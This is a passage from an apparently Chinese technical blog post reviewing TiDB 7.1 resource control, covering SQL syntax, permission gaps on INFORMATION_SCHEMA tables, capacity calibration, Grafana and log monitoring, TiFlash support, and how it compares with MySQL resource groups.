sec)</span><br></pre></td></tr></table></figure></div>
<img  alt="t3.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/4-1688490643879.png"
                      referrerpolicy="no-referrer"
                >
<p>相关讨论见此（感谢 @db_user 的提示）：<a class="link"   href="https://asktug.com/t/topic/1008357" >resource control, 如何查看session级别变量 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h4 id="问题三：I-S-USER-ATTRIBUTES-I-S-RESOURCE-GROUPS-权限控制">问题三：I_S.USER_ATTRIBUTES / I_S.RESOURCE_GROUPS 权限控制</h4>
<p>接上例，如果使用普通用户，如 u2 用户查看 <code>INFORMATION_SCHEMA.PROCESSLIST</code> 表，则只会显示当前用户，或者说是权限范围内能看到的信息：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="keyword">USER</span>, RESOURCE_GROUP, INFO <span class="keyword">from</span> INFORMATION_SCHEMA.PROCESSLIST <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">USER</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------------+-------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">USER</span> <span class="operator">|</span> RESOURCE_GROUP <span class="operator">|</span> INFO                                                                                <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------------+-------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> u2   <span class="operator">|</span> rg2            <span class="operator">|</span> <span class="keyword">SELECT</span> <span class="keyword">USER</span>, RESOURCE_GROUP, INFO <span class="keyword">from</span> INFORMATION_SCHEMA.PROCESSLIST <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">USER</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> u2   <span class="operator">|</span> rg1            <span class="operator">|</span> <span class="keyword">select</span> sleep(<span class="number">1000</span>)                                                                  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------------+-------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></div>
<img  alt="t4.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/5-1688490651998.png"
                      referrerpolicy="no-referrer"
                >
<p>这里的推断是，<code>PROCESSLIST</code> 作为既存表，权限设定都是延用之前的逻辑，这里只是增加了字段，所以很好的继承了权限隔离，即普通用户无权、无法看到其他用户，如用户 u1 正在使用的资源组。</p>
<p>但是，对于新增的表 <code>INFORMATION_SCHEMA.USER_ATTRIBUTES</code> 和 <code>INFORMATION_SCHEMA.RESOURCE_GROUPS</code> 并没有做到如此细粒度的权限控制。</p>
<ul>
<li>对于表 <code>USER_ATTRIBUTES</code>，普通用户可以查看所有用户的属性，如果【问题二】的功能实现，那么普通用户就可以查看到所有用户绑定的资源组。</li>
<li>对于表 <code>RESOURCE_GROUPS</code>，普通用户可以查看所有资源组。那么，关于 Bad SQL 问题，其实就有另外一种处理方式，开发者可以在 SQL 里写入 Hint，使得 Bad SQL 可以“越权”调用 <code>default</code> 资源组，轻则打破平衡，影响其他业务性能，重则打穿资源规划，再现 “一条 SQL 炮轰整个 TiDB 集群” 的威力。</li>
</ul>
<p>从权限角度来看，资源管控所控制的不同资源组虽然做到了资源隔离，但是普通用户可以在 Session 级别随意切换资源组，比如说管理员将普通用户 u2 绑定资源组 rg1，但是 u2 登陆 TiDB 后，可以再切换到 rg2，以获取被分配更多资源的资源组的使用权。</p>
<p>相关交流贴链接：<a class="link"   href="https://asktug.com/t/topic/1008596" >resource control, I_S 权限控制问题 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>正如我在帖子里提到的，对于 TiDB，高效、保质地实现功能是第一位的，权限 (Privileges) 实现次之，这是可以接受、理解的。毕竟，在如此内卷，国产数据库竞争如此激烈的市场环境下，“活下去”才是第一要务。但 Rule is Rule，权限（可以引申为“安全”）也是一个很重要、且绕不开的课题。</p>
<h3 id="6-Resource-Control-相关配置项">6) Resource Control 相关配置项</h3>
<p>参见 <a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/tidb-resource-control#%E7%9B%B8%E5%85%B3%E5%8F%82%E6%95%B0" >官方文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，资源管控引入的两个新变量，</p>
<blockquote>
<p>TiDB：通过配置全局变量 <code>tidb_enable_resource_control</code> 控制是否打开资源组流控。<br>
TiKV：通过配置参数 <code>resource-control.enabled</code> 控制是否使用基于资源组配额的请求调度。</p>
</blockquote>
<p>查看方法如下：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- tidb</span></span><br><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> &quot;tidb_enable_resource_control&quot;;</span><br><span class="line"><span class="comment">-- tikv</span></span><br><span class="line"><span class="keyword">SHOW</span> CONFIG <span class="keyword">WHERE</span> NAME <span class="keyword">LIKE</span> &quot;resource-control.enabled&quot;;</span><br></pre></td></tr></table></figure></div>
<h3 id="7-Calibrate-资源估算">7) Calibrate 资源估算</h3>
<p>据文档 <a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/tidb-resource-control#%E9%A2%84%E4%BC%B0%E9%9B%86%E7%BE%A4%E5%AE%B9%E9%87%8F" >预估集群容量 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 介绍，目前有根据实际负载估算容量，基于硬件部署估算容量，两种估算方式，而比较直观的方法是基于硬件部署估算容量方式，具体命名如下：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 默认 TPC-C 模型预测，等同于下一条命令</span></span><br><span class="line">CALIBRATE RESOURCE;</span><br><span class="line"><span class="comment">-- 根据类似 TPC-C 的负载模型预测</span></span><br><span class="line">CALIBRATE RESOURCE WORKLOAD TPCC;</span><br><span class="line"><span class="comment">-- 根据类似 sysbench oltp_write_only 的负载模型预测</span></span><br><span class="line">CALIBRATE RESOURCE WORKLOAD OLTP_WRITE_ONLY;</span><br><span class="line"><span class="comment">-- 根据类似 sysbench oltp_read_write 的负载模型预测</span></span><br><span class="line">CALIBRATE RESOURCE WORKLOAD OLTP_READ_WRITE;</span><br><span class="line"><span class="comment">-- 根据类似 sysbench oltp_read_only 的负载模型预测</span></span><br><span class="line">CALIBRATE RESOURCE WORKLOAD OLTP_READ_ONLY;</span><br></pre></td></tr></table></figure></div>
<p>在 TiDB Dashboard v7.1.0 面板上，我们可以看到新增了【资源管控】菜单，如图，</p>
<img  alt="t5.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/6-1688490663320.png"
                      referrerpolicy="no-referrer"
                >
<p>这里也可以查看资源预估情况，但实际上，Dashboard 也是调用上面的 SQL 进行预测，可以从 TiDB-Server 的日志中进行确认。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">...[INFO] [session.go:<span class="number">3878</span>] ... [sql=<span class="string">&quot;calibrate resource workload tpcc&quot;</span>]</span><br><span class="line">...[INFO] [session.go:<span class="number">3878</span>] ... [sql=<span class="string">&quot;calibrate resource workload oltp_read_write&quot;</span>]</span><br><span class="line">...[INFO] [session.go:<span class="number">3878</span>] ... [sql=<span class="string">&quot;calibrate resource workload oltp_read_write&quot;</span>]</span><br><span class="line">...[INFO] [session.go:<span class="number">3878</span>] ... [sql=<span class="string">&quot;calibrate resource workload oltp_read_only&quot;</span>]</span><br><span class="line">...[INFO] [session.go:<span class="number">3878</span>] ... [sql=<span class="string">&quot;calibrate resource workload oltp_write_only&quot;</span>]</span><br></pre></td></tr></table></figure></div>
<p>此外，这款估算模型是基于 TiDB 的多年经验积累，在基准测试的基础上实现的算法，适用于多种环境。<br>
引申一步，对于目前没有升级到 TiDB v7.1.0 版本的集群，或者需要对将要同步到 TiDB 集群的数据库进行容量估算，如何来处理呢？计算过程略微复杂，如果有兴趣可以参加相关源码 <a class="link"   href="https://github.com/pingcap/tidb/blob/v7.1.0/executor/calibrate_resource.go#L295" >calibrate_resource <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
<h2 id="font-color-0080FF-3-“资源管控”-也需要监控-font"><font color='#0080FF'>3. “资源管控” 也需要监控</font></h2>
<h3 id="1-TiDB-Dashboard">1) TiDB Dashboard</h3>
<p>上文提到，TiDB Dashboard 增加了 <a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/dashboard-resource-manager" >【资源管控】 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 菜单，在页面下半部分，展示了 RU 相关图表，可以一目了解查看 TiDB 集群的 RU 负载情况，也可以选中图表的某个时间段，来使用 <a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/sql-statement-calibrate-resource#%E6%A0%B9%E6%8D%AE%E5%AE%9E%E9%99%85%E8%B4%9F%E8%BD%BD%E4%BC%B0%E7%AE%97%E5%AE%B9%E9%87%8F" >“根据实际负载估算容量” <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 功能。</p>
<img  alt="t6.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/7-1688490671170.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="2-Grafana">2) Grafana</h3>
<p>相对于 TiDB Dashboad，Grafana 提供了更全面的监控数据，甚至在面板上分别展示了 读RU (RRU) 和 写RU (WRU)。关于 RRU/WRU 的概念性描述较少，只是在 <a class="link"   href="https://github.com/pingcap/tidb/blob/master/docs/design/2022-11-25-global-resource-control.md#distributed-token-buckets" >设计文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的令牌桶 (Token Buckets) 章节 和 Grafana 的参数介绍页面有所体现。</p>
<h4 id="问题四：RRU-WRU-的表述问题">问题四：RRU/WRU 的表述问题</h4>
<p>关于 RRU/WRU 的表述问题，其实只要关注 RU 就好，这是经过基准测试后的预测值，具有统一的观测价值，只是在监控面板上加以区分，以观测 TiDB 集群的读写情况，在代码提交的记录里，也有研发同学的批注，“面向用户是 RU，监控项里面区分是有更多细节”。相关交流贴参见：</p>
<ul>
<li><a class="link"   href="https://asktug.com/t/topic/1008464" >resource control, Grafana 面板默认配置 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://asktug.com/t/topic/1008693" >resource control, Grafana 文档内容不完整 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h3 id="3-RU-余量问题">3) RU 余量问题</h3>
<p>对于日常运维，至少有两个监控指标需要考虑：</p>
<ul>
<li>日常 RU 余量监控</li>
<li>异常 RU 突增监控</li>
</ul>
<p>其中，对于 RU 余量监控，TiDB 7.1 只能从 Grafana 面板上看到 RU 使用量，没有直观展示 RU 余量情况，所以在 TiDB 7.2 中得到了增强，具体实现可参考 PR: <a class="link"   href="https://github.com/tikv/pd/pull/6523" >resource_manager: add metrics for avaiable RU #6523 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<img  alt="t7.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/8-1688490712475.png"
                      referrerpolicy="no-referrer"
                >
图 -- TiDB 7.1 的 Grafana 面板
<img  alt="t8.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/9-1688490716846.png"
                      referrerpolicy="no-referrer"
                >
图 -- TiDB 7.2 的 Grafana 面板
<h3 id="4-Log">4) Log</h3>
<p>从日志中可以看出什么时候真的开始调用了资源管控，但是无法通过日志或者面板看出有哪些用户使用过资源组。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[2023/06/29 11:27:50.069 +09:00] [INFO] [session.go:3878] [GENERAL_LOG] [conn=7398943596793037429] [user=u2@192.168.195.128] [schemaVersion=53] [txnStartTS=0] [forUpdateTS=0] [isReadConsistency=false] [currentDB=] [isPessimistic=false] [sessionTxnMode=PESSIMISTIC] [sql=&quot;select @@version_comment limit 1&quot;]</span><br><span class="line">[2023/06/29 11:27:58.973 +09:00] [INFO] [session.go:3878] [GENERAL_LOG] [conn=7398943596793037429] [user=u2@192.168.195.128] [schemaVersion=53] [txnStartTS=0] [forUpdateTS=0] [isReadConsistency=false] [currentDB=] [isPessimistic=false] [sessionTxnMode=PESSIMISTIC] [sql=&quot;select current_resource_group()&quot;]</span><br><span class="line">[2023/06/29 11:28:09.557 +09:00] [INFO] [session.go:3878] [GENERAL_LOG] [conn=7398943596793037429] [user=u2@192.168.195.128] [schemaVersion=53] [txnStartTS=0] [forUpdateTS=0] [isReadConsistency=false] [currentDB=] [isPessimistic=false] [sessionTxnMode=PESSIMISTIC] [sql=&quot;set resource group rg1&quot;]</span><br><span class="line">[2023/06/29 11:28:19.532 +09:00] [INFO] [session.go:3878] [GENERAL_LOG] [conn=7398943596793037429] [user=u2@192.168.195.128] [schemaVersion=53] [txnStartTS=0] [forUpdateTS=0] [isReadConsistency=false] [currentDB=] [isPessimistic=false] [sessionTxnMode=PESSIMISTIC] [sql=&quot;select * from test.t1 limit 1&quot;]</span><br><span class="line">[2023/06/29 11:28:19.534 +09:00] [INFO] [controller.go:287] [&quot;[resource group controller] create resource group cost controller&quot;] [name=rg1]</span><br></pre></td></tr></table></figure></div>
<p>如果真的出现【问题三】中描述的，存在 Bad SQL “越权” 运行的情况，可以从日志中查找线索。</p>
<h2 id="font-color-0080FF-4-TiFlash-或将在-7-3-0-中支持-Resource-Control-font"><font color='#0080FF'>4. TiFlash 或将在 7.3.0 中支持 Resource Control</font></h2>
<p>在当前版本 (TiDB 7.1.0 LTS) 中，TiFlash 暂不支持资源管控功能，预计将在 TiDB 7.3 中得到支持。下面从两个实验来观察 TiFlash 组件对资源管控的调度情况，结果肯定是未使用的，不过这个实验可以等 TiDB 7.3 发布之后再做一次，相信会得到不同的结果。</p>
<h3 id="实验一：指定-SQL-从-TiFlash-读取数据，观察执行计划中的-RU-值">实验一：指定 SQL 从 TiFlash 读取数据，观察执行计划中的 RU 值</h3>
<p>对实验表 <code>t</code> 创建 TiFlash 副本，分别从 TiKV / TiFlash 读取数据，并查看实际执行计划中的 RU 值。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- tiflash replica</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> t <span class="keyword">SET</span> TIFLASH REPLICA <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- read from tiflash</span></span><br><span class="line">EXPLAIN ANALYZE FORMAT <span class="operator">=</span> <span class="string">&#x27;verbose&#x27;</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="comment">/*+ read_from_storage(tiflash[t]) */</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>)</span><br><span class="line"><span class="keyword">FROM</span> t;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- read from tikv</span></span><br><span class="line">EXPLAIN ANALYZE FORMAT <span class="operator">=</span> <span class="string">&#x27;verbose&#x27;</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="comment">/*+ read_from_storage(tikv[t]) */</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>)</span><br><span class="line"><span class="keyword">FROM</span> t;</span><br></pre></td></tr></table></figure></div>
<p>SQL 执行结果如图所示，从 TiKV 读取数据的 SQL， RU 值约 40， 而 TiFlash 的 RU 值则为 0，说明当前版本的 TiFlash 并不支持 RU 的计算。</p>
<img  alt="t9.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/10-1688490723000.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="实验二：从日志中观测是否调用资源组控制器">实验二：从日志中观测是否调用资源组控制器</h3>
<p>当某个用户连接到 TiDB 后，并向 TiDB 发出 SQL 语句，TiDB Server 向 PD 发起请求，PD 会创建（分配）一个资源组控制器 (resource group controller)，TiDB Server 会将相关信息打印到日志中，如：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">... [INFO] [controller.go:<span class="number">287</span>] [<span class="string">&quot;[resource group controller] create resource group cost controller&quot;</span>] [name=rg1]</span><br></pre></td></tr></table></figure></div>
<p>我们可以通过分析 TiDB Server 的日志，来观测发送到 TiFlash 的查询是否调用资源组控制器，并以此来判断 TiFlash 是否实现 RU 计算。对照试验如下：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">EXPLAIN ANALYZE FORMAT <span class="operator">=</span> <span class="string">&#x27;verbose&#x27;</span> <span class="keyword">SELECT</span> <span class="comment">/*+ RESOURCE_GROUP(rg2), read_from_storage(tikv[t]) */</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> t;</span><br><span class="line">EXPLAIN ANALYZE FORMAT <span class="operator">=</span> <span class="string">&#x27;verbose&#x27;</span> <span class="keyword">SELECT</span> <span class="comment">/*+ RESOURCE_GROUP(rg3), read_from_storage(tiflash[t]) */</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> t;</span><br></pre></td></tr></table></figure></div>
<img  alt="t10.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/11-1688490730215.png"
                      referrerpolicy="no-referrer"
                >
<img  alt="t11.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/12-1688490733340.png"
                      referrerpolicy="no-referrer"
                >
<p>从截图中可以直观的看到，资源控制器为上面的 SQL 创建了一个资源组消费控制器 (resource group cost controller)，资源组名称为 rg2 。而下面的 SQL 由于从 TiFlash 读取数据，所以并不会调用资源控制器创建新的资源组消费控制器。</p>
<p>需要注意的是，这个实验连续触发可能并不会得到想要的结果，因为源码里实现了资源组控制器实例化判重逻辑，即在本实验中，如果资源控制器已经为用户 u2 创建了 rg2 资源组，那么连续的会话将持续延用已经创建好的控制器，只有当超过 GC 时间 （默认 10 分钟），再次发起新会话，才会再次创建新的资源组消费控制器。</p>
<h2 id="font-color-0080FF-5-与-MySQL-的兼容性-font"><font color='#0080FF'>5. 与 MySQL 的兼容性</font></h2>
<p>前文已经详细列举了 TiDB 中资源控制的语法，在 MySQL 8.0 中也有 <a class="link"   href="https://dev.mysql.com/doc/refman/8.0/en/resource-groups.html" >资源组 (Resource Groups) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 特性，具体可参考 <a class="link"   href="https://dev.mysql.com/worklog/task/?id=9467" >WL#9467: Resource Groups <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，但 TiDB 与之的实现不同，两者并不兼容。</p>
<p>如果同时管理 TiDB 和 MySQL，具体使用时，需要多加区分以免混淆。</p>
<h3 id="相似之处">相似之处</h3>
<ol>
<li>
<p>TiDB, MySQL 中的资源组相关命令，“增 (<code>CREATE RESOURCE GROUP</code>) 删 (<code>DROP RESOURCE GROUP</code>) 改 (<code>ALTER RESOURCE GROUP</code>) 查 (<code>SELECT * FROM INFORMATION_SCHEMA.RESOURCE_GROUPS</code>)” 语法相近，但命令后跟接参数不同，<code>I_S.RESOURCE_GROUPS</code> 表结构亦不同。</p>
</li>
<li>
<p>TiDB, MySQL 均支持 Hint，可以实现语句级资源组调用。</p>
</li>
</ol>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="comment">/*+ RESOURCE_GROUP(rg1) */</span> <span class="keyword">into</span> t1 <span class="keyword">values</span> (<span class="number">1</span>);</span><br></pre></td></tr></table></figure></div>
<h3 id="不同之处">不同之处</h3>
<ol>
<li>MySQL 中资源组的线程优先级 (<code>THREAD_PRIORITY</code>) 设定，需要开启 Linux 中的 <code>CAP_SYS_NICE</code>。而 TiDB 不需要。</li>
</ol>
<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line">[<span class="string">Service</span>]</span><br><span class="line"><span class="string">AmbientCapabilities=CAP_SYS_NICE</span></span><br></pre></td></tr></table></figure></div>
<ol start="2">
<li>TiDB 中资源组设定的 RU 是定值，而在 MySQL 中可以指定 vCPU 为范围值，这个范围值对应所有可用的 CPU。</li>
</ol>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> version()\G</span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">version(): <span class="number">8.0</span><span class="number">.28</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">ALTER</span> RESOURCE <span class="keyword">GROUP</span> rg1 VCPU <span class="operator">=</span> <span class="number">0</span><span class="number">-1</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure></div>
<ol start="3">
<li>TiDB 中的一些 SQL 语法或函数 (Functions) 是特有的，与 MySQL 不兼容，如 <code>CURRENT_RESOURCE_GROUP()</code>。</li>
</ol>
<h2 id="font-color-0080FF-6-回归本源，再看-cgroup-font"><font color='#0080FF'>6. 回归本源，再看 cgroup</font></h2>
<p>前文提到了 MySQL 需要借助 Nice 来控制线程优先级，其实熟悉 Linux 系统的朋友都知道 Nice 成名已久，而 cgroup 这位后来者近年逐渐走入人们的视野，尤其是虚拟化、云化技术（如 Docker, Kubernetes）成熟后，cgroup 技术更是不可或缺。比如，从 RHEL 7 之后，可以直接为某个服务在 systemd 文件中设置 <code>CPUAccounting</code> 和 <code>CPUShares</code> 来控制进程对 CPU 的占用率。从 RHEL 8 开始引入了 cgroup v2，以完善功能，简化配置，CPU 控制参数也做了调整，变为 <code>cpu.weight</code>。</p>
<p>于 TiDB 而言，cgroup 也早有 <a class="link"   href="https://asktug.com/t/topic/37127/2?u=shawnyan" >使用案例 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，比如在 TiDB Server 的 systemd 文件中管控服务的内存配额，来控制 OOM 触发条件。另外，在 TiDB v5.0 版本，对 TiDB Server 的参数 <code>performance.max-procs</code> 实现逻辑做了修改，变更为“默认情况下为当前机器或者 cgroups 的 CPU 数量”，相关内容可参考 PR <a class="link"   href="https://github.com/pingcap/tidb/pull/17706" >#17706 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
<h2 id="font-color-0080FF-总结-font"><font color='#0080FF'>总结</font></h2>
<p>由于时间关系，关于 “资源控制 (Resource Control)” 的内容暂且就分享到这里，内容颇多，相信能读到这里的 “Ti 友” 都是真正喜爱 TiDB 的。文本分享了若干具体的使用方式，也提出了若干问题，力争做到求真务实，相信对 TiDBer 有所提示和帮助。最后，关于 Resource Control 的探索才刚刚开始，期待后续版本中的功能增强（比如，对超时 SQL 进行降级或中止（TiDB 7.2 中已实现），将内存等更多资源纳入 RU，用户支持绑定多资源组等），也期待更多关于此特性的生产案例分享。</p>
<h2 id="font-color-0080FF-参考资料-font"><font color='#0080FF'>参考资料</font></h2>
<ul>
<li><a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/tidb-resource-control" >官方文档 – 资源管控 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://tidb.net/blog/67d82266" >新特性解析丨TiDB 资源管控的设计思路与场景解析 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://asktug.com/t/topic/1006975" >【TiDB v7.1.0 荣誉体验官招募】索尼 PS5 、索尼无线降噪耳机、倍轻松颈部按摩器等你拿！ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://github.com/pingcap/tidb/issues/38825" > Global Resource Quota Control #38825  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<hr>
<p>[1]: AskTUG: <a class="link"   href="https://asktug.com/" >https://asktug.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
[2]: 【社区智慧合集】TiDB 相关 SQL 脚本大全: <a class="link"   href="https://asktug.com/t/topic/999618" >https://asktug.com/t/topic/999618 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
[3]: resource control，default resource group 文档勘误: <a class="link"   href="https://asktug.com/t/topic/1008372/6?u=shawnyan" >https://asktug.com/t/topic/1008372/6?u=shawnyan <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
[4]: resource control 相关，INFORMATION_SCHEMA.USER_ATTRIBUTES 表取值问题: <a class="link"   href="https://asktug.com/t/topic/1008437" >https://asktug.com/t/topic/1008437 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
[5]: resource control, 如何查看session级别变量: <a class="link"   href="https://asktug.com/t/topic/1008357" >https://asktug.com/t/topic/1008357 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
[6]: resource control, I_S 权限控制问题: <a class="link"   href="https://asktug.com/t/topic/1008596" >https://asktug.com/t/topic/1008596 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
[7]: 官方文档: <a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/tidb-resource-control#%E7%9B%B8%E5%85%B3%E5%8F%82%E6%95%B0" >https://docs.pingcap.com/zh/tidb/stable/tidb-resource-control#相关参数 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
[8]: 预估集群容量: <a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/tidb-resource-control#%E9%A2%84%E4%BC%B0%E9%9B%86%E7%BE%A4%E5%AE%B9%E9%87%8F" >https://docs.pingcap.com/zh/tidb/stable/tidb-resource-control#预估集群容量 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
[9]: calibrate_resource: <a class="link"   href="https://github.com/pingcap/tidb/blob/v7.1.0/executor/calibrate_resource.go#L295" >https://github.com/pingcap/tidb/blob/v7.1.0/executor/calibrate_resource.go#L295 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
[10]: 【资源管控】: <a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/dashboard-resource-manager" >https://docs.pingcap.com/zh/tidb/stable/dashboard-resource-manager <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
[11]: “根据实际负载估算容量”: <a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/sql-statement-calibrate-resource#%E6%A0%B9%E6%8D%AE%E5%AE%9E%E9%99%85%E8%B4%9F%E8%BD%BD%E4%BC%B0%E7%AE%97%E5%AE%B9%E9%87%8F" >https://docs.pingcap.com/zh/tidb/stable/sql-statement-calibrate-resource#根据实际负载估算容量 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
[12]: 设计文档: <a class="link"   href="https://github.com/pingcap/tidb/blob/master/docs/design/2022-11-25-global-resource-control.md#distributed-token-buckets" >https://github.com/pingcap/tidb/blob/master/docs/design/2022-11-25-global-resource-control.md#distributed-token-buckets <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
[13]: resource control, Grafana 面板默认配置: <a class="link"   href="https://asktug.com/t/topic/1008464" >https://asktug.com/t/topic/1008464 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
[14]: resource control, Grafana 文档内容不完整: <a class="link"   href="https://asktug.com/t/topic/1008693" >https://asktug.com/t/topic/1008693 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
